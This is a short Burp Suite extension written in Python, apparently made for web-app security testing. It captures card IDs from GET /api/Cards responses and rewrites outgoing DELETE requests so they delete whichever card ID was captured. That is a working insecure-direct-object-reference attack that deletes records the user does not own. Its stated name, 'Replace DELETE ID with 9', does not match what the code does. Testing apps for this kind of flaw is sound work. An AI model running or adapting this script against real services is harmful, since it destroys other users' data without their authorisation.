from burp import IBurpExtender, IHttpListener
import re

class BurpExtender(IBurpExtender, IHttpListener):
    card_id = None
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("Replace DELETE ID with 9")
        self._callbacks.registerHttpListener(self)
        print("[*] Extension loaded: Replaces DELETE ID with 9")

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        request_info = self._helpers.analyzeRequest(messageInfo)
        method = request_info.getMethod()
        url_path = request_info.getUrl().getPath()


        if not messageIsRequest:
            # process response
            if method == "GET" and "/api/Cards" in url_path:
                response = messageInfo.getResponse()
                response_str = self._helpers.bytesToString(response)
                match = re.findall(r'"id"\s*:\s*(\d+)', response_str)

                if match:
                    card_id = match[-1]
                    print("[*] Found card ID: {}".format(card_id))
                    self.card_id = card_id
        else:
            # process request
            if method == "DELETE" and re.match(r"/api/Cards/\d+", url_path):
                req_bytes = messageInfo.getRequest()
                req_str = self._helpers.bytesToString(req_bytes)

                # Modify the request line only
                lines = req_str.split("\r\n")
                lines[0] = re.sub(r"/api/Cards/\d+", "/api/Cards/{}".format(self.card_id), lines[0])
                new_req_str = "\r\n".join(lines)

                # Replace original request with modified version
                messageInfo.setRequest(self._helpers.stringToBytes(new_req_str))
                print("[*] DELETE to /api/Cards/{}".format(self.card_id))

